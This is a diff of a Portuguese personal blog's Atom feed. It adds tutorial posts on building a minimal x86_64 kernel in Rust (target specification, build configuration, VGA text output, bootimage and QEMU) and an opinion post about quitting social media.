+  </span><span class="nl">"os"</span><span class="p">:</span><span class="w"> </span><span class="s2">"none"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"executables"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"linker-flavor"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ld.lld"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"linker"</span><span class="p">:</span><span class="w"> </span><span class="s2">"rust-lld"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"panic-strategy"</span><span class="p">:</span><span class="w"> </span><span class="s2">"abort"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"disable-redzone"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"features"</span><span class="p">:</span><span class="w"> </span><span class="s2">"-mmx,-sse,+soft-float"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<p>Mesmo assim se rodarmos <code class="language-plaintext highlighter-rouge">cargo build --target x86_64-blog_os.json</code> vai dar error:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    [italo@italo blog_os]$ cargo build --target x86_64-blog_os.json
+    Compiling blog_os v0.1.0 (/home/italo/Documentos/api/blog_os)
+    error[E0463]: can't find crate for `core`
+</code></pre></div></div>
+
+<p>Falha! O erro nos informa que o compilador Rust não encontra mais a core biblioteca . Esta biblioteca contém tipos básicos de Rust, como Result, Option e iteradores, e está implicitamente vinculada a todas as no_std caixas.</p>
+
+<p>Vamos espeficicar no <code class="language-plaintext highlighter-rouge">.cargo/config.toml</code></p>
+<div class="language-toml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[unstable]</span>
+<span class="py">build-std</span> <span class="p">=</span> <span class="p">[</span><span class="s">"core"</span><span class="p">,</span> <span class="s">"compiler_builtins"</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>Isso falar para o compilar recompilar essas duas libs</p>
+
+<p>rodando o build novamente tava dando erro na minha maquina. Rodei esses dois comandos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rustup override <span class="nb">set </span>nightly
+rustup component add rust-src <span class="nt">--toolchain</span> nightly-x86_64-unknown-linux-gnu
+</code></pre></div></div>
+
+<p>E depois buildou</p>
+
+<h2 id="interferencias-com-relação-a-memoria">Interferencias com relação a memoria</h2>
+
+<p>O compilador Rust assume que existe um conjunto de funcões integradas e diponiveis a todo o sistema. A marioria das funções é fornecida em <code class="language-plaintext highlighter-rouge">compiler_builtins</code>. No entanto algumas funções não são habilitadas por padrão pq normalmente são fornecidads pela biblioteca C do sistema. Como <code class="language-plaintext highlighter-rouge">memset</code>, <code class="language-plaintext highlighter-rouge">memcpy</code>, <code class="language-plaintext highlighter-rouge">memcmp</code>.</p>
+
+<p>Como não podemos vincula elas na lib C do sistema precisa de uma forma alternatica de fornecer essas funcões para o compilador.
+Felizmente o <code class="language-plaintext highlighter-rouge">compiler_builtins</code> ja tem implementações para todas essas funções e apenas estão desabilitadas para não colidirem com as do lib C.</p>
+
+<p><code class="language-plaintext highlighter-rouge">.cargo/config.toml</code></p>
+<div class="language-toml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[build]</span>
+<span class="py">target</span> <span class="p">=</span> <span class="s">"x86_64-blog_os.json"</span>
+
+<span class="nn">[unstable]</span>
+<span class="py">build-std-features</span> <span class="p">=</span> <span class="nn">["compiler-builtins-mem"]</span>
+<span class="py">build-std</span> <span class="p">=</span> <span class="p">[</span><span class="s">"core"</span><span class="p">,</span> <span class="s">"compiler_builtins"</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>Adicione tbm o build para evitar de usar –target no build</p>
+
+<h2 id="escrevendo-na-tela">Escrevendo na tela</h2>
+
+<p>A maneira mais facil de imprimir texto na tela neste estagio é o buffer de texto VGA. É uma area de memoria especial mapeada para o hardware VGA que contem o conteudo exibido na tela. Normalmente consiste em 25 linhas, cada uma conteudo celulas de 80 chars e cada celula exibe um ASCII</p>
+
+<p>A implementação fica assim:</p>
+
+<div class="language-rs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="n">HELLO</span><span class="p">:</span> <span class="o">&amp;</span><span class="p">[</span><span class="nb">u8</span><span class="p">]</span> <span class="o">=</span> <span class="s">b"Hello World!"</span><span class="p">;</span>
+
+<span class="nd">#[no_mangle]</span>
+<span class="k">pub</span> <span class="k">extern</span> <span class="s">"C"</span> <span class="k">fn</span> <span class="nf">_start</span><span class="p">()</span> <span class="k">-&gt;</span> <span class="o">!</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">vga_buffer</span> <span class="o">=</span> <span class="mi">0xb8000</span> <span class="k">as</span> <span class="o">*</span><span class="k">mut</span> <span class="nb">u8</span><span class="p">;</span>
+
+    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">)</span> <span class="k">in</span> <span class="n">HELLO</span><span class="nf">.iter</span><span class="p">()</span><span class="nf">.enumerate</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">unsafe</span> <span class="p">{</span>
+            <span class="o">*</span><span class="n">vga_buffer</span><span class="nf">.offset</span><span class="p">(</span><span class="n">i</span> <span class="k">as</span> <span class="nb">isize</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">byte</span><span class="p">;</span>
+            <span class="o">*</span><span class="n">vga_buffer</span><span class="nf">.offset</span><span class="p">(</span><span class="n">i</span> <span class="k">as</span> <span class="nb">isize</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0xb</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">loop</span> <span class="p">{}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Primeiro convertemos o numero <code class="language-plaintext highlighter-rouge">0xb8000</code> para um ponteiro bruto. Em seguida iteramos sobre os bytes da string estatica. Dentro do for usamos o metodo para escrever byte na string e a cor dela.</p>
+
+<h2 id="executando-nosso-kernel">Executando nosso Kernel</h2>
+
+<p>Agora que temos um executável que faz algo perceptível, é hora de executá-lo. Primeiro, precisamos transformar nosso kernel compilado em uma imagem de disco inicializável, vinculando-o a um gerenciador de inicialização. Então podemos executar a imagem do disco na máquina virtual QEMU ou inicializá-la em hardware real usando um pendrive.</p>
+
+<p>Em vez de escrever nosso próprio bootloader, que é um projeto por si só, usamos o bootloader crate. Esta caixa implementa um bootloader BIOS básico sem nenhuma dependência C, apenas Rust e montagem embutida. Para usá-lo para inicializar nosso kernel, precisamos adicionar uma dependência nele:</p>
+
+<p><code class="language-plaintext highlighter-rouge">Cargo.toml</code></p>
+<div class="language-toml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">[dependencies]</span>
+<span class="py">bootloader</span> <span class="p">=</span> <span class="s">"0.9.23"</span>
+</code></pre></div></div>
+<p>Run:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cargo <span class="nb">install </span>bootimage
+cargo bootimage
+</code></pre></div></div>
+
+<p>Execulte <code class="language-plaintext highlighter-rouge">qemu-system-x86_64 -drive format=raw,file=target/x86_64-blog_os/debug/bootimage-blog_os.bin</code> e vc vera seu os rodar.</p>
+
+<p>para pendrive:
+<code class="language-plaintext highlighter-rouge">dd if=target/x86_64-blog_os/debug/bootimage-blog_os.bin of=/dev/sdX &amp;&amp; sync</code></p>]]></content><author><name></name></author><category term="ciencia" /><category term="programacao" /><category term="os" /><category term="rust" /><summary type="html"><![CDATA[No final teremos o json assim.]]></summary></entry><entry><title type="html">Porque eu apaguei todas minhas redes sociais ?</title><link href="http://italocobainsblog.com/vida/psicologia/rede_sociais/sociedade/mascara/2023/10/23/Porque-eu-apaguei-todas-minhas-rede-sociais.html" rel="alternate" type="text/html" title="Porque eu apaguei todas minhas redes sociais ?" /><published>2023-10-23T14:30:00-03:00</published><updated>2023-10-23T14:30:00-03:00</updated><id>http://italocobainsblog.com/vida/psicologia/rede_sociais/sociedade/mascara/2023/10/23/Porque-eu-apaguei-todas-minhas-rede-sociais</id><content type="html" xml:base="http://italocobainsblog.com/vida/psicologia/rede_sociais/sociedade/mascara/2023/10/23/Porque-eu-apaguei-todas-minhas-rede-sociais.html"><![CDATA[<p>O real intuito pelo qual as redes sociais foram criado é algo bom mas não posso dizer o mesmo do que ela se tornou. Inicialmente as redes sociais tinha o trabalho de gerar interessões sobre usuarios, era um local onde amigos se juntavam para zuar e postar momentos tipo um habbo. Ao longo dos anos com a introdução de empresas comecializando nas redes sociais tudo viro um limbo de propagando e markting, hj em dia a cada 10 posts que vc abre 3 são anuncios e o pior estamos todos sendo manipulados por um algoritmo que analisar seus status e tem acessos ao seu microfone e gerencia seus desejos como propaganda. Ja estamos tão cegos e viciados em redes sociais que nem ligamos se perdemos 5 segundos de nossas vida vendo o novo lançamento do filme que vai sair semana que vem.</p>
+
+<h2 id="submundo">Submundo</h2>
+
+<p>Cada rede social tem seu intuito e publico, na minha visão eu as classifico assim.</p>
+
+<ul>
+  <li>Instagram: Rede social onde vc posta tudo de bom da sua mera vida e omite as coisas ruim (mostrando para os outros que sua vida é uma maravilha, obs: tudo isso é uma mascara pois nada é real)</li>
+</ul>
+
+<p>Eu sempre digo os que mais postam são os mais tristes e vazios.</p>
+
+<ul>
+  <li>
+    <p>LinkedIn: Seu perfil de trabalhador basicamente uma carteira de trabalho em formato de rede social. (não tem nada dms a não ser a falsa ilusão de que todos ama seu trabalho para atrair recrutadores.)</p>
+  </li>
+  <li>
+    <p>Twitter: Esse é o pior no twitter temos 4 tipos de usuarios, os normies que apenas usam para ver noticia de pagina fake, pessoas deprimidas que falam mal dos outros e da propria vida e se mal dizem de barriga cheia, amantes de pornografia, usuarios de conteudo esqueroso como (pedofilia, zoofilia e etc…)</p>
+  </li>
+</ul>
+
+<p>Embora não seja muito falado sobre esses assuntos basta um boa navegada pelo twitter e vc ja começa a acha essas maluquisses.</p>
+
+<p>Como é um rede social meio que abadonada pq a moderação não trabalha direito tudo rola a solta.</p>
+
+<ul>
+  <li>
+    <p>Facebook: Não tenho muito a comentar não uso desde 2015 mas se assemelha ao Instagram.</p>
+  </li>
+  <li>
+    <p>TikTok:  Esse aqui não te da nada em troca e te faz perder um tempo gigantesco, alem de ter um algoritmo que so te tras dopamina rapida ou seja viciante</p>
+  </li>
+</ul>
+
+<p>Depois que essa empressas começar a imitar o google adsenses com remuneração para criadores de conteudo as coisa vao de mal a pior, a internet esta cheia de conteudo porco e inutil de videos imbecies de garrafas quebrando a videos de duplo sentido com intuito pornografico. Cada vez mais forçado em busca de um mera remuneração e fama.</p>
+
+<p>Depois que remove essas redes sociais do meu celular tenho tido mais paz se espirito e meus dias não passam mais tão rapido. Embora eu não tenha saido de todas pois preciso de algumas para trabalho as que eu sai ja fizeram uma grande diferença.</p>]]></content><author><name></name></author><category term="vida" /><category term="psicologia" /><category term="rede_sociais" /><category term="sociedade" /><category term="mascara" /><summary type="html"><![CDATA[O real intuito pelo qual as redes sociais foram criado é algo bom mas não posso dizer o mesmo do que ela se tornou. Inicialmente as redes sociais tinha o trabalho de gerar interessões sobre usuarios, era um local onde amigos se juntavam para zuar e postar momentos tipo um habbo. Ao longo dos anos com a introdução de empresas comecializando nas redes sociais tudo viro um limbo de propagando e markting, hj em dia a cada 10 posts que vc abre 3 são anuncios e o pior estamos todos sendo manipulados por um algoritmo que analisar seus status e tem acessos ao seu microfone e gerencia seus desejos como propaganda. Ja estamos tão cegos e viciados em redes sociais que nem ligamos se perdemos 5 segundos de nossas vida vendo o novo lançamento do filme que vai sair semana que vem.]]></summary></entry><entry><title type="html">Escrevendo um sistema operacional com rust part 2</title><link href="http://italocobainsblog.com/ciencia/programacao/os/rust/2023/10/23/Escrevendo-um-sistema-operacional-com-rust-part-2.html" rel="alternate" type="text/html" title="Escrevendo um sistema operacional com rust part 2" /><published>2023-10-23T11:30:00-03:00</published><updated>2023-10-23T11:30:00-03:00</updated><id>http://italocobainsblog.com/ciencia/programacao/os/rust/2023/10/23/Escrevendo-um-sistema-operacional-com-rust-part-2</id><content type="html" xml:base="http://italocobainsblog.com/ciencia/programacao/os/rust/2023/10/23/Escrevendo-um-sistema-operacional-com-rust-part-2.html"><![CDATA[<p>Olá amigos vamos começar o segundo passo do nosso sistema operacional. Na parte inicial
+ja temos um programa rust independente com ponto de entrada e funcao de panic configurados alem de 
+podermos compilar para qualquer arquitetura.</p>
+
+<p>Nesse post vamos criar uma kernel de no minimo 64 bits para arquitetura x86 baseado no nosso binario independente.</p>
+
+<h2 id="o-processo-de-inicialização">O processo de inicialização</h2>
+
+<p>Quando ligamos o computador, ele começa a execultar codigo do firmware armazenado na <a href="https://en.wikipedia.org/wiki/Read-only_memory">ROM</a> da placa mãe. Este codigo executa um <a href="https://en.wikipedia.org/wiki/Power-on_self-test">Power-on self-test</a>, detectar a RAM disponivel e pre-inicializa a CPU e o hardware. Depois, procura um disco inicializável e inicia a kernel do sistema operacional.</p>
+
+<p>No x86 existem dois padrões de firmware: o “Basic Input/Output System” <a href="https://en.wikipedia.org/wiki/BIOS">BIOS</a> e o mais recente “Unified Extensible Firmware Interface” <a href="https://en.wikipedia.org/wiki/UEFI">UEFI</a>. O padrão BIOS é antigo e desatualizado, mas simples e bem suportado em qualquer máquina x86 desde a década de 1980. O UEFI, por outro lado, é mais moderno e tem muito mais recurso, mas é mais complexo de configurar.</p>
+
+<p>Atualmente, fornecemos apenas suporte para BIOS.</p>
+
+<h2 id="inicialização-do-bios">Inicialização do BIOS</h2>
+
+<p>Quase todas os sistemas x86 tem suporte para inicialização BIOS, incluindo maquinas mais recentes baseadas em UEFI que usam BIOS emulado. Isso é otimo por que vc pode usar a mesma logica de inicialização em todas as maquinas do seculo passado. Mas essa ampla compatibilidade é ao mesmo tempo a maior desvantagem da inicialização BIOS, por que significa que a CPU é colocada em um modo de compatibilidade de 16 bits chamado modo <a href="https://en.wikipedia.org/wiki/Real_mode">real</a> antes da inicialização, para que os carregadores de inicialização arcaicos da decada de 1980 ainda funcionem.</p>
+
+<p>Vamos começar do inicio:</p>
+
+<p>Quando vc liga o computador ele carrega a BIOS de alguma memoria flash especial localizada na placa mae. O BIOS executa rotinas de autoteste e inicialização do hardware e, em seguida, procura disco inicializavel. Se encontrar um, o controler é transferido para o seu bootloader, que é uma porção de 512 bytes de codigo executavel armazenado no inicio do disco. A maioria dos bootloaders tem mais de 512 bytes, entt os bootloaders são comumente divididos em um pequeno primeiro estagio, que cabe em 512 bytes e um segundo estagio que é posteriormente carregado pelo primeiro.</p>
+
+<p>O bootloader deve determinar a localização da imagem do kernel no disco e carrega-la na memoria. ELe tambem precisar mudar a CPU do <a href="https://en.wikipedia.org/wiki/Real_mode">modo real</a> para o <a href="https://en.wikipedia.org/wiki/Protected_mode">modo protegido</a> de 32 bits e depois para o <a href="https://en.wikipedia.org/wiki/Long_mode">modo longo</a> de 64 bits, onde os registros de 64 bits e a memoria principal completa estao disponiveis. Sua terceira tarefa é consultar certas informacoes como (um mapa de memoria) do BIOS e passa-la para o kernel do sistema operacional.</p>
+
+<p>Escrever um bootloader é um pouco complicado pois requer linguaguem como assembly e muitas etapas não esclarecedoras, como “escrever este valor magico neste registro do processador”. Portanto não abordaremos a criacao de bootloader nesse post, em vez disso, forneceremos uma ferramenta chamada <a href="https://github.com/rust-osdev/bootimage">bootimage</a> que acrecenta automaticamente um bootloader ao seu kernel.</p>
+
+<h3 id="o-padrão-de-inicialização-múltipla">O padrão de inicialização múltipla</h3>
+
+<p>Para evitar que cada sistema operacional implemente seu proprio bootloader, que so é compativel com um unico sistema, a <a href="https://en.wikipedia.org/wiki/Free_Software_Foundation">Free Software Foundation</a> criou um padrão de bootloader aberto chamado <a href="https://wiki.osdev.org/Multiboot">Multiboot</a> em 1995. O padrão define uma interface entre o bootloader e o sistema operacional, para que qualquer bootloader compativel com MultiBoot possa carregar possa carregar qualquer sistema operacional com multiboot.</p>
+
+<p>Para tornar um kernel compatível com Multiboot, basta inserir o chamado <a href="https://www.gnu.org/software/grub/manual/multiboot/multiboot.html#OS-image-format">cabeçalho Multiboot</a> no início do arquivo do kernel. Isso torna muito fácil inicializar um sistema operacional a partir do GRUB. No entanto, o GRUB e o padrão Multiboot também apresentam alguns problemas:</p>
+
+<ul>
+  <li>
+    <p>Eles suportam apenas o modo protegido de 32 bits. Isso significa que você ainda precisa fazer a configuração da CPU para mudar para o modo longo de 64 bits.</p>
+  </li>
+  <li>
+    <p>Eles são projetados para tornar o bootloader simples em vez do kernel. Por exemplo, o kernel precisa estar vinculado a um tamanho de página padrão ajustado , porque o GRUB não consegue encontrar o cabeçalho Multiboot de outra forma. Outro exemplo é que as informações de inicialização , que são passadas para o kernel, contêm muitas estruturas dependentes da arquitetura em vez de fornecer abstrações limpas.</p>
+  </li>
+  <li>
+    <p>Tanto o GRUB quanto o padrão Multiboot são pouco documentados.</p>
+  </li>
+  <li>
+    <p>O GRUB precisa ser instalado no sistema host para criar uma imagem de disco inicializável a partir do arquivo do kernel. Isso torna o desenvolvimento em Windows ou Mac mais difícil.</p>
+  </li>
+</ul>
+
+<p>Devido a essas desvantagens, decidimos não usar o GRUB ou o padrão Multiboot. No entanto, planejamos adicionar suporte Multiboot à nossa ferramenta bootimage , para que seja possível carregar seu kernel também em um sistema GRUB.</p>
+
+<h3 id="uefi">UEFI</h3>
+<p>Não oferecemos suporte UEFI no momento.</p>
+
+<h2 id="um-kernel-mínimo">Um kernel mínimo</h2>
+
+<p>Agora que sabemos aproximadamente como um computador inicia, é hora de criar nosso proprio kernel minimo, Nosso objetivo é criar uma imagem que imprima um “Hello world” para a tela quando inicializar. Fazemos isso estendendo o binario rust independente</p>
+
+<p>Como você deve se lembrar, construímos o binário independente por meio do cargo, mas dependendo do sistema operacional, precisávamos de diferentes nomes de pontos de entrada e sinalizadores de compilação. Isso ocorre porque cargoas compilações para o sistema host por padrão, ou seja, o sistema em que você está executando. Isso não é algo que queremos para o nosso kernel, porque um kernel que roda sobre, por exemplo, o Windows, não faz muito sentido. Em vez disso, queremos compilar para um sistema de destino claramente definido .</p>
+
+<h2 id="instalando-rust-nightly">Instalando Rust Nightly</h2>
+
+<p>RUst tem três canais de lançamento: stable, beta e nightly. O Rust Book explica muito bem a diferença entre esses canais, então reselve um minuto <a href="https://doc.rust-lang.org/book/appendix-07-nightly-rust.html#choo-choo-release-channels-and-riding-the-trains">e de uma olhada</a>. Para contruir um sistema operacional, precisamos de alguns recursos experimentais que estão disponiveis apenas no canal nightly, portanto, precisamos instalar uma versão nightly do rust</p>
+
+<p>Para gerenciar instalações Rust, recomendo enfaticamente o rustup . Ele permite que você instale compiladores noturnos, beta e estáveis ​​lado a lado e facilita sua atualização. Com o Rustup, você pode usar um compilador noturno para o diretório atual executando <code class="language-plaintext highlighter-rouge">rustup override set nightly</code>. Alternativamente, você pode adicionar um arquivo chamado <code class="language-plaintext highlighter-rouge">rust-toolchain</code> com o conteúdo <code class="language-plaintext highlighter-rouge">nightly</code> ao diretório raiz do projeto. Você pode verificar se possui uma versão noturna instalada executando <code class="language-plaintext highlighter-rouge">rustc --version</code>: O número da versão deve conter -nightly no final.</p>
+
+<p>O compilador noturno nos permite ativar vários recursos experimentais usando os chamados sinalizadores de recurso na parte superior do nosso arquivo. Por exemplo, poderíamos ativar a <code class="language-plaintext highlighter-rouge">asm!</code> macro experimental para montagem inline adicionando <code class="language-plaintext highlighter-rouge">#![feature(asm)]</code> ao topo do nosso arquivo main.rs. Observe que esses recursos experimentais são completamente instáveis, o que significa que versões futuras do Rust podem alterá-los ou removê-los sem aviso prévio. Por este motivo, só os utilizaremos se for absolutamente necessário.</p>
+
+<h3 id="especificação-de-destino">Especificação de destino</h3>
+
+<p>Cargo oferece suporte a diferentes sistemas de destino por meio do –targetparâmetro. O alvo é descrito pelo chamado <a href="https://clang.llvm.org/docs/CrossCompilation.html#target-triple">alvo triplo</a> que descreve a arquitetura da CPU, o fornecedor, o sistema operacional e a <a href="https://stackoverflow.com/questions/2171177/what-is-an-application-binary-interface-abi/2456882#2456882">ABI</a>. Por exemplo, o <code class="language-plaintext highlighter-rouge">x86_64-unknown-linux-gnu</code> triplo alvo descreve um sistema com <code class="language-plaintext highlighter-rouge">x86_64</code> CPU, sem fornecedor claro e um sistema operacional Linux com GNU ABI. Rust oferece suporte a <a href="https://doc.rust-lang.org/nightly/rustc/platform-support.html">muitos triplos de destino diferentes</a>, inclusive <code class="language-plaintext highlighter-rouge">arm-linux-androideabi</code> para Android ou <code class="language-plaintext highlighter-rouge">wasm32-unknown-unknown</code> para WebAssembly.</p>
+
+<p>Para o nosso sistema alvo, no entanto, necessitamos de alguns parâmetros de configuração especiais (por exemplo, nenhum sistema operacional subjacente), de modo que nenhum dos triplos alvo existentes se ajuste. Felizmente, Rust nos permite definir nosso próprio alvo através de um arquivo JSON. Por exemplo, um arquivo JSON que descreve o <code class="language-plaintext highlighter-rouge">x86_64-unknown-linux-gnu</code> destino tem esta aparência:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"llvm-target"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x86_64-unknown-linux-gnu"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"data-layout"</span><span class="p">:</span><span class="w"> </span><span class="s2">"e-m:e-i64:64-f80:128-n8:16:32:64-S128"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"arch"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x86_64"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"target-endian"</span><span class="p">:</span><span class="w"> </span><span class="s2">"little"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"target-pointer-width"</span><span class="p">:</span><span class="w"> </span><span class="s2">"64"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"target-c-int-width"</span><span class="p">:</span><span class="w"> </span><span class="s2">"32"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"os"</span><span class="p">:</span><span class="w"> </span><span class="s2">"linux"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"executables"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"linker-flavor"</span><span class="p">:</span><span class="w"> </span><span class="s2">"gcc"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"pre-link-args"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">"-m64"</span><span class="p">],</span><span class="w">
+    </span><span class="nl">"morestack"</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>A maioria dos campos é exigida pelo LLVM para gerar código para essa plataforma. Por exemplo, o <a href="https://llvm.org/docs/LangRef.html#data-layout">data-layout</a> campo define o tamanho de vários tipos inteiros, de ponto flutuante e de ponteiro. Depois, há campos que Rust usa para compilação condicional, como target-pointer-width. O terceiro tipo de campo define como a caixa deve ser construída. Por exemplo, o pre-link-argscampo especifica argumentos passados ​​ao <a href="https://en.wikipedia.org/wiki/Linker_(computing)">vinculador</a>.</p>
+
+<p>Também visamos <code class="language-plaintext highlighter-rouge">x86_64</code> sistemas com nosso kernel, então nossa especificação de destino será muito semelhante à acima. Vamos começar criando um <code class="language-plaintext highlighter-rouge">x86_64-blog_os.json</code> arquivo (escolha o nome que desejar) com o conteúdo comum:</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+    </span><span class="nl">"llvm-target"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x86_64-unknown-none"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"data-layout"</span><span class="p">:</span><span class="w"> </span><span class="s2">"e-m:e-i64:64-f80:128-n8:16:32:64-S128"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"arch"</span><span class="p">:</span><span class="w"> </span><span class="s2">"x86_64"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"target-endian"</span><span class="p">:</span><span class="w"> </span><span class="s2">"little"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"target-pointer-width"</span><span class="p">:</span><span class="w"> </span><span class="s2">"64"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"target-c-int-width"</span><span class="p">:</span><span class="w"> </span><span class="s2">"32"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"os"</span><span class="p">:</span><span class="w"> </span><span class="s2">"none"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"executables"</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>]]></content><author><name></name></author><category term="ciencia" /><category term="programacao" /><category term="os" /><category term="rust" /><summary type="html"><![CDATA[Olá amigos vamos começar o segundo passo do nosso sistema operacional. Na parte inicial ja temos um programa rust independente com ponto de entrada e funcao de panic configurados alem de podermos compilar para qualquer arquitetura.]]></summary></entry><entry><title type="html">Escrevendo um sistema operacional com rust</title><link href="http://italocobainsblog.com/ciencia/programacao/os/rust/2023/10/22/Escrevendo-um-sistema-operacional-com-rust.html" rel="alternate" type="text/html" title="Escrevendo um sistema operacional com rust" /><published>2023-10-22T22:10:00-03:00</published><updated>2023-10-22T22:10:00-03:00</updated><id>http://italocobainsblog.com/ciencia/programacao/os/rust/2023/10/22/Escrevendo-um-sistema-operacional-com-rust</id><content type="html" xml:base="http://italocobainsblog.com/ciencia/programacao/os/rust/2023/10/22/Escrevendo-um-sistema-operacional-com-rust.html"><![CDATA[<p>Olá amates de low level, hoje vamos começar um longa jornada onde vou apresentar pra voces minha trajetoria escrevendo um sistema operacional simples em rust. Vou utilizar o tutorial do <a href="https://os.phil-opp.com/freestanding-rust-binary/">os.phil-opp.com</a> para seguir essa jornada vou tentar melhorar o possivel no codigo dele lembrando que não sou um programador muito experiente em rust e nem sei tanto sobre criação de OS isso vai ser apenas um experimento meu que quero compartilhar com vcs.</p>
 
 <h1 id="1-por-onde-começar">1. Por onde começar</h1>
 
@@ -223,7 +741,7 @@ cargo rustc <span class="nt">--</span> <span class="nt">-C</span> link-args<span
 cargo rustc <span class="nt">--</span> <span class="nt">-C</span> link-args<span class="o">=</span><span class="s2">"-e __start -static -nostartfiles"</span>
 </code></pre></div></div>
 
-<p>Esse foi o primeira etapa fique atento a novas postagens.</p>]]></content><author><name></name></author><category term="ciencia" /><category term="programacao" /><category term="os" /><category term="rust" /><summary type="html"><![CDATA[Olá amates de low level, hoje vamos começar um longa jornada onde vou apresentar pra voces minha trajetoria escrevendo um sistema operacional simples em rust. Vou utilizar o tutorial do os.phil-opp.com para seguir essa jornada vou tentar melhorar o possivel no codigo dele lembrando que não sou um programador muito experiente em rust e nem sei tanto sobre criação de OS isso vai ser apenas um experimento meu que quero compartilhar com vcs.]]></summary></entry><entry><title type="html">Como funciona a compressão de dados</title><link href="http://localhost:4000/programa%C3%A7%C3%A3o/algoritmos/logica/dados/2023/05/04/Compress%C3%A3o-de-dados.html" rel="alternate" type="text/html" title="Como funciona a compressão de dados" /><published>2023-05-04T05:10:00-03:00</published><updated>2023-05-04T05:10:00-03:00</updated><id>http://localhost:4000/programa%C3%A7%C3%A3o/algoritmos/logica/dados/2023/05/04/Compress%C3%A3o-de-dados</id><content type="html" xml:base="http://localhost:4000/programa%C3%A7%C3%A3o/algoritmos/logica/dados/2023/05/04/Compress%C3%A3o-de-dados.html"><![CDATA[<p>Olá! Nesse post, vamos explorar os conceitos de compressão de dados, na faculdades de ciencia da computação estudamos que em computadores tudo é um grande “LINGUISÃO DE BITS” que apenas é traduzido por tabelação para caractere, tendo isso em mente vamos entender como funciona o pensamento sobre compressão de dados.</p>
+<p>Esse foi o primeira etapa fique atento a novas postagens.</p>]]></content><author><name></name></author><category term="ciencia" /><category term="programacao" /><category term="os" /><category term="rust" /><summary type="html"><![CDATA[Olá amates de low level, hoje vamos começar um longa jornada onde vou apresentar pra voces minha trajetoria escrevendo um sistema operacional simples em rust. Vou utilizar o tutorial do os.phil-opp.com para seguir essa jornada vou tentar melhorar o possivel no codigo dele lembrando que não sou um programador muito experiente em rust e nem sei tanto sobre criação de OS isso vai ser apenas um experimento meu que quero compartilhar com vcs.]]></summary></entry><entry><title type="html">Como funciona a compressão de dados</title><link href="http://italocobainsblog.com/programa%C3%A7%C3%A3o/algoritmos/logica/dados/2023/05/04/Compress%C3%A3o-de-dados.html" rel="alternate" type="text/html" title="Como funciona a compressão de dados" /><published>2023-05-04T05:10:00-03:00</published><updated>2023-05-04T05:10:00-03:00</updated><id>http://italocobainsblog.com/programa%C3%A7%C3%A3o/algoritmos/logica/dados/2023/05/04/Compress%C3%A3o-de-dados</id><content type="html" xml:base="http://italocobainsblog.com/programa%C3%A7%C3%A3o/algoritmos/logica/dados/2023/05/04/Compress%C3%A3o-de-dados.html"><![CDATA[<p>Olá! Nesse post, vamos explorar os conceitos de compressão de dados, na faculdades de ciencia da computação estudamos que em computadores tudo é um grande “LINGUISÃO DE BITS” que apenas é traduzido por tabelação para caractere, tendo isso em mente vamos entender como funciona o pensamento sobre compressão de dados.</p>
 
 <h1 id="1-o-que-é-a-compressão-de-dados">1. O que é a compressão de dados</h1>
 
@@ -312,7 +830,7 @@ embora não seja gritante a diferença, esse é o algoritmo de (RLE) Run Length 
